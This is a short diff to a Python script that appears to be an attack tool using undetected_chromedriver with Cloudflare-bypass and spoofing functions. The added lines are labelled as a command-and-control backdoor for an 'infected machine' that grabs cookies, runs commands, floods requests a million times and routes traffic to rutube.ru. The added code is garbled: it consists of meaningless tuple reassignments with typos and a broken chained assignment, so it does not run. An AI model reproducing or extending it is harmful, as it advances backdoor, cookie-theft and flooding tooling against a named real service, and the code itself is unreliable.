@@ -6,6 +6,7 @@ from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
 from sys import stdout
 from colorama import Fore, init
+import base64
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -1238,3 +1239,22 @@ if __name__ == '__main__':
         Server.C2 = (Recv.request, (80))
         Arguments_add_parser = ("--command", "execute the command in the infected machine")
         Arguments_add_parser = ("--port", "Command to execute in a the port machine")
+        
+
+        ## Create a command to execute the command
+        Server.C2 = (Execute, Arguments_add_parser)
+        Server.C2 = (Recv.request, (IP, PORT))
+        Server.C2 = (Recv.request, (IP, PORT))
+        Server.C2 = (send.request, (execute))
+        ## Here start the Backdoor function
+        Server.C2 = (Backdoor, (IP, PORT))
+        C2.Backdoor = (get_cookie, (execute))
+        C2.Bakdoor = (getaddresses, (IP))
+        C2.Backdoor = (LaunchSPOOF)
+        C2.Backdoor = (countdown)
+        C2.Server = (LaunchCFB.send_requests, exec(Min.requests, 1000000))
+        C2.Backdoor = (time.sleep, (5))
+        HTTP = (get_target.send_requests, (min.request, 6500))
+        HTTP = Serverproxy(REDIRECT, "rutube.ru:80")
+        HTTP = Serverproxy = (REDIRECT, "rutube.ru:443")
+        HTTP = (connection.traffic, base64)
